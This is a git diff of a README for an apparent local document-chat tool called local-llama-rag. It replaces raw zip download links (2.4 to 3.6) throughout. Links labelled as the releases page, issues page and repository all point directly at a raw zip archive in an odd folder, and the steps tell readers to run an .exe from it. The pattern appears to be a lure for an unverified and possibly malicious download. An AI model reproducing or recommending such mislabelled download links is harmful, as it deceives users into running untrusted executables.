@@ -6,10 +6,10 @@ Welcome to local-llama-rag! This application lets you chat with your local docum
 
 ## 📥 Download and Install
 
-[![Download local-llama-rag](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip%https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip)](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip)
+[![Download local-llama-rag](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip%https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip)](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip)
 
 To download the software, visit the Releases page:
-[Visit Releases Page](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip).
+[Visit Releases Page](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip).
 
 ## 💻 System Requirements
 
@@ -23,14 +23,14 @@ Before installing, ensure your system meets the following requirements:
 ## 📂 Steps to Install
 
 1. **Download the Software**
-   - Go to the [Releases page](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip).
+   - Go to the [Releases page](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip).
    - Locate the latest version.
    - Click on the downloadable file that matches your operating system.
 
 2. **Run the Installer**
    - For Windows: Double-click on the `.exe` file you downloaded.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the downloaded `https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip` file and follow the instructions in the README file included.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip` file and follow the instructions in the README file included.
 
 3. **Open the Application**
    - After installation, find the local-llama-rag icon on your desktop or in your applications list. Click to open it.
@@ -63,11 +63,11 @@ If you experience issues, try the following:
 
 ## 📄 Additional Help
 
-For further assistance, please check the [GitHub Issues page](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip). You can find common problems listed there and possible solutions.
+For further assistance, please check the [GitHub Issues page](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip). You can find common problems listed there and possible solutions.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip)
-- [Visit Releases Page](https://github.com/LENGENDARYGOAT/local-llama-rag/raw/refs/heads/main/volipresence/llama_rag_local_2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/LENGENDARYGOAT/local-llama-rag/main/volipresence/llama_rag_local_3.6.zip)
 
 Thank you for choosing local-llama-rag! Enjoy chatting with your documents privately today.
